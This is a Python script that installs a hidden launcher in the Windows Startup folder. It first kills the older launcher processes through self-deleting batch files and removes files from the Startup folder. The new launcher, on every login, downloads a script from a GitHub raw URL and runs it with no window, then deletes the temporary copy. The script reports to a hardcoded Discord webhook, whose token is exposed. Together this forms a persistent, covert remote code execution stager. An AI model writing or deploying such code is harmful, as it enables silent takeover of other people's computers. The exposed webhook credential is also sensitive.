# monitor_script.py - Kills only old launcher, not current process
import os
import sys
import subprocess
import tempfile
import time
import requests

# Discord webhook
WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(message):
    try:
        data = {"content": message}
        requests.post(WEBHOOK, json=data, timeout=5)
    except:
        pass

def kill_only_old_launcher():
    """Kill only the old launcher process, not this one"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # Get current process ID to avoid killing ourselves
    current_pid = os.getpid()
    
    # Create batch file that targets only the old launcher
    batch_script = f'''@echo off
:: Get the path to the old launcher
set STARTUP_PATH="{startup_folder}\\Startup.pyw"

:: Find processes running the old launcher (but not current monitor script)
wmic process where "commandline like '%%Startup.pyw%%' and not commandline like '%%monitor_script.py%%'" get processid 2>nul | findstr /r "[0-9]" > "%TEMP%\\old_pids.txt"

:: Kill each old launcher process
for /f "tokens=*" %%i in (%TEMP%\\old_pids.txt) do (
    taskkill /f /pid %%i 2>nul
)

:: Also kill by window title (old launcher console)
taskkill /fi "windowtitle eq GitHub Auto-Deploy Launcher*" /f 2>nul
taskkill /fi "windowtitle eq Press Enter to close*" /f 2>nul

:: Clean up
del "%TEMP%\\old_pids.txt" 2>nul
timeout /t 2 /nobreak >nul
echo Old launcher killed
del "%~f0" 2>nul
'''
    
    batch_path = tempfile.gettempdir() + "/kill_old_only.bat"
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run batch file
    subprocess.Popen(['cmd', '/c', batch_path],
                    creationflags=subprocess.CREATE_NO_WINDOW)
    
    time.sleep(3)  # Wait for kill to complete
    return True

def create_new_launcher():
    """Create the new Startup.pyw"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # The new launcher code
    launcher_code = '''import os
import sys
import subprocess
import urllib.request
import tempfile
import time

def run_script():
    """Download and run script.py from GitHub"""
    try:
        url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py"
        script_code = urllib.request.urlopen(url, timeout=10).read().decode('utf-8')
        
        temp_dir = tempfile.gettempdir()
        timestamp = str(int(time.time()))
        temp_script = os.path.join(temp_dir, f"monitor_{timestamp}.py")
        
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(script_code)
        
        # Run hidden
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        subprocess.Popen(
            [sys.executable, temp_script],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Delete temp file after 10 seconds
        time.sleep(10)
        try:
            os.remove(temp_script)
        except:
            pass
        
        return True
        
    except Exception as e:
        return False

def main():
    """Main launcher function"""
    # Wait for network
    time.sleep(5)
    
    # Run the script
    run_script()
    
    # Keep alive
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()
'''
    
    # Write the launcher
    launcher_path = os.path.join(startup_folder, "Startup.pyw")
    with open(launcher_path, 'w', encoding='utf-8') as f:
        f.write(launcher_code)
    
    print(f"✓ Created new launcher: {launcher_path}")
    return launcher_path

def cleanup_files():
    """Clean up old files"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    print("Cleaning up files...")
    
    # Delete specific files
    files_to_delete = [
        "startup_log.txt",
        "github_launcher.pyw",
        "update_cache.json",
        "requirements.txt",
        "clean_launcher.pyw"
    ]
    
    deleted = []
    for filename in files_to_delete:
        filepath = os.path.join(startup_folder, filename)
        if os.path.exists(filepath):
            try:
                os.remove(filepath)
                deleted.append(filename)
            except:
                pass
    
    if deleted:
        print(f"Deleted: {', '.join(deleted)}")
    
    return True

def start_new_launcher(launcher_path):
    """Start the new launcher"""
    try:
        # Create batch file to start launcher after current process exits
        batch_script = f'''@echo off
timeout /t 3 /nobreak >nul
start /b "" pythonw "{launcher_path}"
echo New launcher started
del "%~f0" 2>nul
'''
        
        batch_path = tempfile.gettempdir() + "/start_new.bat"
        with open(batch_path, 'w') as f:
            f.write(batch_script)
        
        subprocess.Popen(['cmd', '/c', batch_path],
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        print("✓ New launcher will start in 3 seconds")
        return True
        
    except:
        return False

def main():
    """Main function"""
    print("=" * 60)
    print("LAUNCHER UPDATER - SELECTIVE KILL")
    print("=" * 60)
    
    # Step 1: Kill only old launcher
    print("\n[1/4] Killing old launcher (not current process)...")
    kill_only_old_launcher()
    
    # Step 2: Clean up files
    print("\n[2/4] Cleaning up files...")
    cleanup_files()
    
    # Step 3: Create new launcher
    print("\n[3/4] Creating new launcher...")
    launcher_path = create_new_launcher()
    
    # Step 4: Start new launcher
    print("\n[4/4] Starting new launcher...")
    start_new_launcher(launcher_path)
    
    # Send webhook
    send_webhook("✅ Launcher updated! Old launcher killed, new launcher created.")
    
    print("\n" + "=" * 60)
    print("UPDATE COMPLETE!")
    print("✓ Old launcher killed")
    print("✓ Files cleaned up")
    print("✓ New launcher created")
    print("✓ New launcher will start automatically")
    print("=" * 60)
    
    # Wait and exit
    time.sleep(2)

if __name__ == "__main__":
    main()
